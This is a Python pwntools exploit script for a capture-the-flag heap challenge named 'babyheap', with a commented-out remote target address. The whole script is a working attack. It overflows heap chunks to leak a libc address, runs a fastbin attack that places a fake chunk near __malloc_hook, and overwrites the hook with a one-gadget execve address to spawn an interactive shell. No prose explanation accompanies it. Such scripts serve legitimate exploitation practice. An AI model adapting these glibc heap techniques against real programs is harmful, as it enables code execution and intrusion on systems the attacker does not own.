from pwn import *

context.log_level="debug"
context.terminal=["tmux","splitw","-v"]

r=process("./babyheap")
#r=remote("111.198.29.45", 32272)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
def debug():
    baseaddr=0x555555554000
    gdb.attach(r,"b *{b1}\nb*{b2}\nb *{b3}".format(b1=hex(baseaddr+0xF5B),b2=hex(baseaddr+0xc73),b3=hex(baseaddr+0xCE)))

def New(length,content):
    r.recvuntil(">> ")
    r.sendline("1")
    print str(length)
    r.sendline(str(length))
    r.sendline(content)
 
def Edit(index,length,content):
    r.recvuntil(">> ")
    r.sendline("2")
    r.sendline(str(index))
    r.sendline(str(length))
    r.sendline(content)

def Print(index):
    r.recvuntil(">> ")
    r.sendline("3")
    r.sendline(str(index))

def Delete(index):
    r.recvuntil(">> ")
    r.sendline("4")
    r.sendline(str(index))


New(0x40,"0"*0x3f)#0
New(0x100,"1"*0x3f)#1
New(0x40,"2"*0x3f)
payload="a"*0x40+p64(0)+p64(0x113)
print len(payload)
Edit(0,len(payload),payload)
New(0x100,"0"*0xff)#2

payload='c' * 0x10 + p64(0) + p64(0x71)
Edit(2, 0x21,payload)

Delete(1)
New(0x60,"0"*0x5f)#1free,3alloc
payload='b' * 0x40 + p64(0) + p64(0x111)
Edit(1, 0x51, payload)

New(0x50,"0"*0x4f)
Delete(2)
Print(1)
addr=r.recvuntil('1')
top_chunk_addr=u64(addr[0x50:0x58])
print hex(top_chunk_addr)
libc_base=top_chunk_addr-0x3c4b78

#exploit
malloc_hook = libc.symbols['__malloc_hook'] + libc_base
execve_addr = 0x4526a + libc_base

Delete(1)

need_malloc_addr=malloc_hook-27-8
print "need_addr=%s"%(hex(need_malloc_addr))
payload = 'a' * 0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 27 - 0x8) + p64(0)
Edit(0, 0x60 + 0x10 + 0x11, payload)
debug()
raw_input()
New(0x60,"0"*0x5f)
New(0x60,"0"*0x5f)

payload  = p8(0) * 3
payload += p64(0) * 2
payload  += p64(execve_addr)
print hex(execve_addr)

print "111111111111111111111111"
Edit(2, 28, payload)
# debug()
# raw_input()
print "22222222222222222"
New(0x20,"0"*0x1f)

r.interactive()
